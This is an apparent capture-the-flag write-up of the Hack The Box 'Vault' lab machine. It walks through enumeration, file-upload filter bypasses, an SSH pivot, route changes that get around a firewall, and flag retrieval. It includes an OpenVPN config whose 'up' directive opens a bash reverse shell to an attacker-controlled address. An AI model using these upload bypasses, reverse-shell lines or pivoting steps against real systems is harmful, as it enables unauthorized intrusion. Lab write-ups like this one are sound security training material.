<p><img src="/assets/images/vault.png" /></p>

<h1 id="vault-101010109">Vault: 10.10.10.109</h1>

<h1 id="recon">Recon:</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u 10.10.10.109 -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: nmap | Threads: 10 | Wordlist size: 6040

Error Log: /home/srbz/git/tools/_web/dirsearch/logs/errors-18-11-13_02-07-01.log

Target: 10.10.10.109

[02:07:01] Starting: 
[02:07:04] 403 -  298B  - /.ht_wsr.txt
(...)
[02:07:50] 200 -  299B  - /index.php[02:07:50] 
[02:08:10] 200 -  299B  - /index.php/login/
(...)
Task Completed

</code></pre></div></div>

<p><img src="/assets/images/index_vault.png" style="width: 70%" /></p>

<p>After a few enumerations, you should have quickly reached this login page. If you didn’t, you should consider enumerating recursevily directories.</p>

<p><img src="/assets/images/login_vault.png" style="width: 35%" /></p>

<blockquote>
  <p>Trying to pass this login page was not the solution. After a while I told my self, what if the index page is saying right. So kept enumerating and found new files.</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u http://10.10.10.109/sparklays/design -w common.txt -e html,php,txt -f

(...)
[20:18:43] 200 -   72B  - /sparklays/design/design.html
(...)
</code></pre></div></div>

<p>This page gave access to a file upload module with restrictions. Hence, impossible to tell the server to execute commands through a script directly. I remembered few <a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">technics</a> for bypassing this type of server side control:</p>

<ul>
  <li>Adding a double extension: <code class="highlighter-rouge">myFile.jpg.php</code></li>
  <li>Changing letters to their capital forms: <code class="highlighter-rouge">myFile.PhP</code></li>
  <li>Using short name (for Windows servers)</li>
  <li>Dropping the string after the first extension by using the <code class="highlighter-rouge">NULL</code> character <code class="highlighter-rouge">0x00</code>: <code class="highlighter-rouge">myFile.jpg0x00.php</code></li>
  <li>Finding missed extension (e.g. <code class="highlighter-rouge">.php5</code>, <code class="highlighter-rouge">.pht</code>, <code class="highlighter-rouge">.phtml</code>, <code class="highlighter-rouge">.shtml</code>, <code class="highlighter-rouge">.asa</code>, <code class="highlighter-rouge">.cer</code>, <code class="highlighter-rouge">.asax</code>, <code class="highlighter-rouge">.swf</code>, or <code class="highlighter-rouge">.xap</code>)</li>
</ul>

<blockquote>
  <p>Replacing the reverse shell extension for the missed extension <code class="highlighter-rouge">.php5</code> gave access to the ubuntu host as <code class="highlighter-rouge">www-data</code>.</p>
</blockquote>

<h1 id="privesc">PrivEsc</h1>

<p>My first reflex was to check what services were reachable from the internal.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
udp        0      0 192.168.122.1:53        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:58192           0.0.0.0:*                           -               
udp6       0      0 :::5353                 :::*                                -               
udp6       0      0 :::48208                :::*                                -   
</code></pre></div></div>

<p>Note that local IP adress <code class="highlighter-rouge">192.168.122.1:53</code> is on another network.</p>

<p>Since nmap was disabled for the <code class="highlighter-rouge">www-data</code> user, I try to run <code class="highlighter-rouge">socat</code> and <code class="highlighter-rouge">ncat</code> in order to be able to do port forwarding, but they wasn’t installed. Then it took a second to find the files left on the desktop, which allowed me to rotate through ssh!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>key
itscominghome

<span class="nb">cat</span> /home/dave/Desktop/ssh
dave
Dav3therav3123

<span class="nb">cat </span>Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -fNtD 9050 dave@10.10.10.109 [-L 127.0.0.1:8888:192.168.122.4:80]
proxychains firefox 192.168.122.4
</code></pre></div></div>

<p><img src="/assets/images/vault_vpn.jpg" style="width:30%" /></p>

<p>This <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">medium article</a> defines well what it is and how it’s possible to pop a shell out of an OpenVPN config file, so I wont go in details.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1'"
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat ssh
dave
dav3gerous567


cat user*
a4***************************3
</code></pre></div></div>

<blockquote>
  <p>At this point you could have change the root password and connect with ssh using these credentials and found alex’s <code class="highlighter-rouge">.bash_history</code> where you would have seen that he was pinging the <code class="highlighter-rouge">192.168.5.2</code> IP adress. But no chance, this adress was no longuer reachable.</p>
</blockquote>

<p>All the traffic to the Vault was passing trough the  <code class="highlighter-rouge">192.168.122.5</code> firewall.</p>

<p>Bypassing firewall was easy. All I had to do was adding another IP adress to the same interface and remove that routing. Then, running a basic scan on this target to unveil the <code class="highlighter-rouge">987/tcp</code> port wich was exposing a ssh service that was using the same credential then the DNS box.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun0
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun1
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun2
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun3
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun4
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun5
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.122.0   *               255.255.255.0   U     0      0        0 ens3

root@DNS:# ip address add 192.168.5.137/24 dev ens3
root@DNS:# route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
root@DNS:# ping 192.168.5.2
PING 192.168.5.2 (192.168.5.2) 56(84) bytes of data.
64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=1.56 ms
</code></pre></div></div>

<h1 id="welcome-to-the-vault">Welcome to the Vault!</h1>

<p>To complete the box, you had to <code class="highlighter-rouge">scp</code> the <code class="highlighter-rouge">root.txt.gpg</code> back to the ubuntu box and pass the key <code class="highlighter-rouge">itscominghome</code>. ;)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You need a passphrase to unlock the secret key for
user: "david &lt;dave@david.com&gt;"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david &lt;dave@david.com&gt;"
      gpg: .srb: unknown suffix
      Enter new filename [root.txt]: root.txt

cat root.txt 
ca4********************819
</code></pre></div></div>
